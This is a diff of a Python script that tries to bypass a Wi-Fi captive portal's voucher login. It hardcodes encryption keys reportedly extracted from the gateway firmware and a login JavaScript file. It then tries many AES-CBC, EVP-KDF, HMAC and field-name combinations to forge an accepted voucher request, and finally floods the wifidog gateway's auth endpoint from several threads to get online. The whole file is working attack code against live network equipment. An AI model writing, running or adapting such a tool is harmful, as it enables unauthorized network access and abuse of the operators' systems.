@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-Focused encrypted auth test - tries different encryption formats with fresh session.
+Comprehensive encrypted auth test - tries ALL format combinations
 """
-import base64, hashlib, json, os, sys, time, urllib.parse
+import base64, hashlib, json, os, sys, time, urllib.parse, threading
 import requests, urllib3
 urllib3.disable_warnings()
 
-# ---- Pure Python AES-128-CBC (NIST-verified) ----
+# ---- Pure Python AES-128-CBC ----
 def _aes_encrypt_block(key, pt):
     _s = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
           0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
@@ -66,7 +66,30 @@ def aes_cbc(key, iv, data):
         r += e; p = e
     return r
 
-RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
+# ---- Helpers ----
+def parse_octal(s):
+    if not s: return b""
+    out = bytearray(); i = 0
+    while i < len(s):
+        if s[i]=='\\' and i+3<len(s) and s[i+1:i+4].isdigit():
+            out.append(int(s[i+1:i+4],8)); i+=4
+        else: out.append(ord(s[i])); i+=1
+    return bytes(out)
+
+def evp_kdf(key_bytes, salt, dkLen=48):
+    """EVP_BytesToKey with MD5 (CryptoJS passphrase KDF)"""
+    d, dtot = b"", b""
+    while len(dtot) < dkLen:
+        d = hashlib.md5(d + key_bytes + salt).digest()
+        dtot += d
+    return dtot[:32], dtot[32:48]  # key, iv
+
+# ---- Keys ----
+BIN_KEY = b"RenderSecretKey2026!@#"  # from core.so strings
+WEB_KEY = b"RjYkhwzx$2018!"           # from voucherLogin.js
+
+BIN_KEY_MD5 = hashlib.md5(BIN_KEY).digest()
+WEB_KEY_MD5 = hashlib.md5(WEB_KEY).digest()
 
 def get_sid():
     sess = requests.Session()
@@ -79,123 +102,194 @@ def get_sid():
     sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
     return sid, host, params, sess
 
-def test_encrypted(label, sess, api_url, enc_data):
+def test(label, sess, url, json_data, show=True):
     try:
-        r = sess.post(api_url, json={"data": enc_data}, timeout=5)
+        r = sess.post(url, json=json_data, timeout=5)
         j = r.json()
         ok = j.get("success") == True and j.get("result",{}).get("authResult") == "1"
-        print(f"  [{label}] {j.get('message','?')[:40]}  {'*** SUCCESS ***' if ok else ''}")
+        msg = j.get("message", str(j))[:50]
+        if show:
+            print(f"  [{label}] {msg}  {'*** SUCCESS ***' if ok else ''}")
         return ok, j
     except Exception as e:
-        print(f"  [{label}] error: {e}")
+        if show: print(f"  [{label}] error: {e}")
         return False, {}
 
-# Get fresh session
+# ---- Main ----
 sid, host, params, sess = get_sid()
 api_url = f"{host}/api/auth/voucher/?lang=en_US"
+gw_addr = params.get("gw_address",["192.168.10.1"])[0]
+gw_port = params.get("gw_port",["2060"])[0]
 chap_id = params.get("chap_id",[""])[0]
 chap_chal = params.get("chap_challenge",[""])[0]
 print(f"SID: {sid}")
 print(f"Host: {host}")
+print(f"CHAP_ID: {chap_id[:16] if chap_id else '(none)'}")
+print(f"GW: {gw_addr}:{gw_port}")
 
-# Build payload with code 102762
-payload_content = {
-    "sessionId": sid,
-    "accessCode": "102762",
-    "apiVersion": 1,
-}
-payload_str = json.dumps(payload_content)
+# Build base payload
+payload_obj = {"sessionId": sid, "accessCode": "102762", "apiVersion": 1}
+payload_str = json.dumps(payload_obj)
 print(f"\nPayload: {payload_str}")
 
-# Format A: base64(iv + ciphertext) - our current
-print("\n--- FORMAT A: iv+ct base64 ---")
-iv = os.urandom(16)
-ct = aes_cbc(RENDER_KEY, iv, payload_str.encode())
-enc = base64.b64encode(iv + ct).decode()
-test_encrypted("A1", sess, api_url, enc)
+# ---- Try plain JSON first (baseline) ----
+print("\n--- BASELINE: plain JSON ---")
+test("plain", sess, api_url, payload_obj)
+# Also try with phoneNumber field
+p2 = dict(payload_obj)
+p2["phoneNumber"] = "102762"
+test("+phone", sess, api_url, p2)
+# Try with version=2
+p3 = dict(payload_obj)
+p3["apiVersion"] = 2
+test("v2", sess, api_url, p3)
 
-# Format B: just base64(ciphertext), no IV
-ct2 = aes_cbc(RENDER_KEY, bytes(16), payload_str.encode())  # zero IV
-enc2 = base64.b64encode(ct2).decode()
-test_encrypted("B (zero iv)", sess, api_url, enc2)
+# ---- Encrypted: try BOTH keys, multiple formats ----
+KEYS = [("binMD5", BIN_KEY_MD5), ("webMD5", WEB_KEY_MD5)]
+# Passphrase mode: EVP KDF with no salt (treated as password directly)
+SALTLESS = evp_kdf(BIN_KEY, b"")  # key, iv from passphrase, no salt
 
-# Format C: base64(ciphertext) with random IV derived from key+payload
-iv3 = hashlib.md5(RENDER_KEY + payload_str.encode()).digest()[:16]
-ct3 = aes_cbc(RENDER_KEY, iv3, payload_str.encode())
-enc3 = base64.b64encode(iv3 + ct3).decode()
-test_encrypted("C (derived iv)", sess, api_url, enc3)
+print("\n--- ENCRYPTED FORMATS ---")
+for klabel, k in KEYS:
+    iv_rand = os.urandom(16)
 
-# Format D: urlsafe base64
-enc4 = base64.urlsafe_b64encode(iv + ct).decode()
-test_encrypted("D (urlsafe)", sess, api_url, enc4)
+    # F1: base64(iv + ct)
+    ct = aes_cbc(k, iv_rand, payload_str.encode())
+    enc = base64.b64encode(iv_rand + ct).decode()
+    test(f"{klabel} IV+CT", sess, api_url, {"data": enc})
 
-# Format E: hex
-enc5 = (iv + ct).hex()
-test_encrypted("E (hex)", sess, api_url, enc5)
+    # F2: urlsafe base64(iv + ct)
+    enc_u = base64.urlsafe_b64encode(iv_rand + ct).decode().rstrip("=")
+    test(f"{klabel} URLSAFE", sess, api_url, {"data": enc_u})
 
-# Format F: CryptoJS OpenSSL format (Salted__ + salt + ct)
-from hashlib import md5 as MD5
+    # F3: just ct, no iv
+    test(f"{klabel} CTonly", sess, api_url, {"data": base64.b64encode(ct).decode()})
+
+    # F4: hex
+    test(f"{klabel} HEX", sess, api_url, {"data": (iv_rand + ct).hex()})
+
+    # F5: with a_data field name
+    test(f"{klabel} a_data", sess, api_url, {"a_data": enc})
+    test(f"{klabel} a_data URL", sess, api_url, {"a_data": enc_u})
+
+    # F6: with encrypted_data field name
+    test(f"{klabel} enc_data", sess, api_url, {"encrypted_data": enc})
+
+    # F7: encrypted field
+    test(f"{klabel} encrypted", sess, api_url, {"encrypted": enc})
+
+    # F8: zero IV
+    ct0 = aes_cbc(k, bytes(16), payload_str.encode())
+    test(f"{klabel} ZIV", sess, api_url, {"data": base64.b64encode(bytes(16) + ct0).decode()})
+
+# ---- EVP KDF (passphrase mode with salt) ----
+print("\n--- EVP KDF (passphrase mode) ---")
 salt = os.urandom(8)
-dtot, d = b"", b""
-while len(dtot) < 48:
-    d = MD5(d + RENDER_KEY + salt).digest(); dtot += d
-key32, iv6 = dtot[:32], dtot[32:48]
-ct6 = aes_cbc(key32, iv6, payload_str.encode())
-enc6 = base64.b64encode(b"Salted__" + salt + ct6).decode()
-test_encrypted("F (EVP KDF)", sess, api_url, enc6)
+k_evp, iv_evp = evp_kdf(BIN_KEY, salt)
+ct_evp = aes_cbc(k_evp, iv_evp, payload_str.encode())
 
-# Format G: Encrypt with the key as passphrase (not raw bytes)
-# Reuse Format F approach
-test_encrypted("G (re-F)", sess, api_url, enc6)
+# OpenSSL salted format: Salted__ + salt + ct
+openssl_fmt = base64.b64encode(b"Salted__" + salt + ct_evp).decode()
+test("OpenSSL salted", sess, api_url, {"data": openssl_fmt})
 
-# Format H: Try with only accessCode (no sessionId in payload)
-payload2 = json.dumps({"sessionId": sid, "accessCode": "102762"})
-ct_h = aes_cbc(RENDER_KEY, iv, payload2.encode())
-enc_h = base64.b64encode(iv + ct_h).decode()
-test_encrypted("H (no apiVer)", sess, api_url, enc_h)
+# Just IV+CT using the derived key
+test("EVP IV+CT", sess, api_url, {"data": base64.b64encode(iv_evp + ct_evp).decode()})
 
-# Format I: Include CHAP fields (like core.so arrange_data)
-chap_md5 = hashlib.md5(parse_octal(chap_id) + b"102762" + parse_octal(chap_chal)).hexdigest() if chap_id else ""
-payload3 = json.dumps({
-    "sessionId": sid, "accessCode": "102762", "password": chap_md5,
-    "chap_id": chap_id, "chap_challenge": chap_chal,
-})
-ct_i = aes_cbc(RENDER_KEY, iv, payload3.encode())
-enc_i = base64.b64encode(iv + ct_i).decode()
-test_encrypted("I (with CHAP)", sess, api_url, enc_i)
+# Same but no salt
+k_evp2, iv_evp2 = evp_kdf(BIN_KEY, b"")
+ct_evp2 = aes_cbc(k_evp2, iv_evp2, payload_str.encode())
+test("EVP nosalt IV+CT", sess, api_url, {"data": base64.b64encode(iv_evp2 + ct_evp2).decode()})
 
-# Format J: Try accessCode=102762 in plain JSON one more time
-r = sess.post(api_url, json={"accessCode":"102762","sessionId":sid,"apiVersion":1}, timeout=5)
-print(f"  [J (plain)] {r.json().get('message','?')}")
+# ---- With CHAP fields (like core.so arrange_data) ----
+print("\n--- WITH CHAP FIELDS ---")
+if chap_id:
+    chap_md5 = hashlib.md5(parse_octal(chap_id) + b"102762" + parse_octal(chap_chal)).hexdigest()
+else:
+    chap_md5 = ""
+payload_chap = {"sessionId": sid, "accessCode": "102762", "apiVersion": 1,
+                "password": chap_md5, "chap_id": chap_id, "chap_challenge": chap_chal}
+payload_chap_str = json.dumps(payload_chap)
 
-# Format K: Try high-speed ping with phonenumber
-gw_addr = params.get("gw_address",["192.168.10.1"])[0]
-gw_port = params.get("gw_port",["2060"])[0]
+for klabel, k in KEYS:
+    iv = os.urandom(16)
+    ct = aes_cbc(k, iv, payload_chap_str.encode())
+    enc = base64.b64encode(iv + ct).decode()
+    test(f"{klabel} CHAP data", sess, api_url, {"data": enc})
+    test(f"{klabel} CHAP plain", sess, api_url, payload_chap)
+
+# ---- HMAC-SHA256 appended to ciphertext ----
+print("\n--- HMAC-SHA256 suffix ---")
+for klabel, k in KEYS:
+    iv = os.urandom(16)
+    ct = aes_cbc(k, iv, payload_str.encode())
+    hmac_val = hashlib.sha256(k + ct).digest()
+    enc = base64.b64encode(iv + ct + hmac_val).decode()
+    test(f"{klabel} IV+CT+HMAC", sess, api_url, {"data": enc})
+
+# Try HMAC as separate field
+ct = aes_cbc(BIN_KEY_MD5, os.urandom(16), payload_str.encode())
+hmac_val = hashlib.sha256(BIN_KEY_MD5 + ct).digest()
+enc = base64.b64encode(os.urandom(16) + ct).decode()
+test("HMAC field", sess, api_url, {"data": enc, "signature": hmac_val.hex()})
+
+# ---- phoneNumber field in encrypted ----
+print("\n--- WITH phoneNumber ---")
+payload_phone = dict(payload_obj)
+payload_phone["phoneNumber"] = "102762"
+payload_phone_str = json.dumps(payload_phone)
+for klabel, k in KEYS:
+    iv = os.urandom(16)
+    ct = aes_cbc(k, iv, payload_phone_str.encode())
+    test(f"{klabel} +phone data", sess, api_url, {"data": base64.b64encode(iv + ct).decode()})
+
+# ---- SHA256(sid + accessCode) as key ----
+print("\n--- DERIVED KEYS ---")
+derived_key = hashlib.sha256(f"{sid}102762".encode()).digest()[:16]
+iv = os.urandom(16)
+ct = aes_cbc(derived_key, iv, payload_str.encode())
+test("SHA256(sid+code)", sess, api_url, {"data": base64.b64encode(iv + ct).decode()})
+
+# sid itself as key
+sid_key = sid.encode()[:16]
+iv = os.urandom(16)
+ct = aes_cbc(sid_key, iv, payload_str.encode())
+test("SID key", sess, api_url, {"data": base64.b64encode(iv + ct).decode()})
+
+# ---- Try different API endpoints ----
+print("\n--- OTHER ENDPOINTS ---")
+test("plain /ga_voucherlogin", sess,
+     f"{host}/ga_voucherlogin?lang=en_US",
+     payload_obj)
+
+# ---- High-speed ping with phonenumber ----
+print(f"\n=== HIGH-SPEED PING ===")
 ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=102762"
-print(f"\n[K] High-speed ping with phonenumber...")
-import threading
+print(f"Ping URL: {ping_url}")
 stop = False
 def pinger():
     while not stop:
-        try: sess.get(ping_url, timeout=5)
+        try: sess.get(ping_url, timeout=3)
         except: break
 for _ in range(5):
     threading.Thread(target=pinger, daemon=True).start()
-time.sleep(5)
-stop = True
-r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
-print(f"  generate_204: {r.status_code}")
-if r.status_code == 204:
-    print("  *** ONLINE ***")
+for i in range(15):
+    time.sleep(2)
+    try:
+        r = requests.get("http://www.google.com", timeout=3)
+        if r.status_code == 200:
+            print(f"  *** ONLINE *** (t={i*2}s)")
+            stop = True
+            break
+    except: pass
 else:
-    r2 = requests.get("http://www.google.com", timeout=5)
-    print(f"  google.com: {r2.status_code}")
+    print("  Ping done - no online detected")
+stop = True
 
-def parse_octal(s):
-    if not s: return b""
-    out = bytearray(); i = 0
-    while i < len(s):
-        if s[i]=='\\' and i+3<len(s) and s[i+1:i+4].isdigit():
-            out.append(int(s[i+1:i+4],8)); i+=4
-        else: out.append(ord(s[i])); i+=1
-    return bytes(out)
+# Final check
+try:
+    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
+    print(f"  Final generate_204: {r.status_code}")
+except Exception as e:
+    print(f"  Final: {e}")
+
+print("\nDone")
